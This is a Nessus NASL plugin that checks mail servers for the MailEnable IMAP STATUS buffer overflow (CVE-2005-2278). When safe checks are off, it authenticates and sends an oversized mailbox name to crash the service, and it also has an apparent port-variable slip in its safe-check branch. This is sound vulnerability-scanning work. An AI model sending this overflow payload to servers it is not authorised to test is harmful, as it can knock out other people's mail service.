#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(19193);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2016/10/27 15:03:54 $");

  script_cve_id("CVE-2005-2278");
  script_bugtraq_id(14243);
  script_osvdb_id(17844);

  script_name(english:"MailEnable IMAP STATUS Command Remote Overflow");
  script_summary(english:"Checks for STATUS command buffer overflow in MailEnable's IMAP service");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by a buffer overflow vulnerability." );
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of MailEnable's IMAP service
that is prone to a buffer overflow attack when processing a STATUS
command with a long mailbox name.  Once authenticated, an attacker can
exploit this flaw to execute arbitrary code subject to the privileges
of the affected application." );
  script_set_attribute(attribute:"see_also", value:"http://www.coresecurity.com/common/showdoc.php?idx=467&idxseccion=10" );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Jul/202" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to MailEnable Professional 1.6 or later or to MailEnable
Enterprise Edition 1.1 or later." );
  script_set_cvss_base_vector("CVSS2#AV:L/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'MailEnable IMAPD (1.54) STATUS Request Buffer Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/14");
  script_set_attribute(attribute:"patch_publication_date", value: "2005/06/30");
  script_set_attribute(attribute:"vuln_publication_date", value: "2005/07/12");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mailenable:mailenable");
  script_end_attributes();
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_dependencie("smtpserver_detect.nasl", "imap4_banner.nasl");
  script_exclude_keys("imap/false_imap");
  script_require_keys("imap/login", "imap/password");
  script_require_ports("Services/smtp", 25, "Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");
include("smtp_func.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


# Make sure the banner is for MailEnable.
banner = get_imap_banner(port:port);
if (!banner || "* OK IMAP4rev1 server ready" >!< banner) exit(0);


# If safe checks are enabled...
if (safe_checks()) {
  # Check the version number from the SMTP server's banner.
  smtp_port = get_kb_item("Services/smtp");
  if (!smtp_port) port = 25;
  if (!get_port_state(smtp_port)) exit(0);
  if (get_kb_item('SMTP/'+smtp_port+'/broken')) exit(0);

  banner = get_smtp_banner(port:port);
  if (banner =~ "Mail(Enable| Enable SMTP) Service") {
    # nb: Standard Edition seems to format version as "1.71--" (for 1.71),
    #     Professional Edition formats it like "0-1.2-" (for 1.2), and
    #     Enterprise Edition formats it like "0--1.1" (for 1.1).
    ver = eregmatch(pattern:"Version: (0-+)?([0-9][^- ]+)-*", string:banner);
    if (ver == NULL) {
      exit(1, "cannot determine version of MailEnable's SMTP connector service");
    }
    if (ver[1] == NULL) {
      edition = "Standard";
    }
    else if (ver[1] == "0-") {
      edition = "Professional";
    }
    else if (ver[1] == "0--") {
      edition = "Enterprise";
    }
    if (isnull(edition)) {
      exit(1, "cannot determine edition of MailEnable's SMTP connector service");
    }
    ver = ver[2];

    if (
      # nb: Professional versions < 1.6 are vulnerable.
      (edition == "Professional" && ver =~ "^1\.[0-5]") ||
      # nb: Enterprise versions < 1.1 are vulnerable.
      (edition == "Enterprise" && ver =~ "^1\.0")
    ) {
      security_hole(port);
    }
  }
 exit(0);
}
# Otherwise, try to exploit it.
else {
  user = get_kb_item("imap/login");
  pass = get_kb_item("imap/password");
  if ((user == "") || (pass == "")) {
    exit(0, "imap/login and/or imap/password are empty");
  }

  # Establish a connection.
  tag = 0;
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # Read banner.
  s = recv_line(socket:soc, length:1024);
  if (!strlen(s)) {
    close(soc);
    exit(0);
  }

  # Log in.
  ++tag;
  c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = "";
  }

  # If successful, try to exploit the flaw.
  if (resp && resp =~ "OK") {
    ++tag;
    c = string(
      "nessus", string(tag), 
      ' STATUS "', crap(10540), '" (UIDNEXT UIDVALIDITY MESSAGES UNSEEN RECENT)'
    );
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
      resp = "";
    }

    # If there's no response, make sure it's really down.
    if (!s || !resp) {
      # Try to reestablish a connection and read the banner.
      soc2 = open_sock_tcp(port);
      if (soc2) s2 = recv_line(socket:soc2, length:1024);

      # If we couldn't establish the connection or read the banner,
      # there's a problem.
      if (!soc2 || !strlen(s2)) {
        security_hole(port);
        exit(0);
      }
      close(soc2);
    }
  }
  # Else, let user know there was a problem with the credentials.
  else if (resp && resp =~ "NO") {
    debug_print("couldn't login with supplied IMAP credentials!", level:1);
  }

  # Be nice and logout if there's still a connection.
  if (soc) {
    ++tag;
    c = string("nessus", string(tag), " LOGOUT");
    send(socket:soc, data:string(c, "\r\n"));
    close(soc);
  }
}
